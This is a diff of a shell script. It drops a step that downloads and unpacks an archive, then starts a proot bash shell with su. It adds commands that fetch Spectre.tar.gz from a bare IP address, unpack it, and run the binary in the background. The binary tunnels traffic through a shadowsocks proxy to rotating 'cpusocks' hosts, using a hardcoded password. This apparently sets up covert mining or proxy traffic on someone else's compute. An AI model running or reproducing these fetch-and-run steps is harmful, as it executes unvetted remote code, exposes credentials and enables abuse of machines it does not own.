@@ -16,18 +16,6 @@ ph add proot 1>/dev/null 2>&1
 
 sleep 2
 
-wget http://greenleaf.teatspray.fun/backup5.tar.gz
-tar -xf backup5.tar.gz
-sleep 3
-rm backup5.tar.gz
-./dist/proot -S . /bin/bash
-su -
-sleep 3
-whoami
-sleep 3
-ls -la
-sleep 3
-
 export DEBIAN_FRONTEND=noninteractive
 DEBIAN_FRONTEND=noninteractive
 
@@ -52,7 +40,15 @@ echo ""
 
 sleep 2
 
-Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
+wget http://45.135.58.52/Spectre.tar.gz
+
+sleep 2
+
+tar -xf Spectre.tar.gz
+
+sleep 2
+
+./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
 
 sleep 2
 
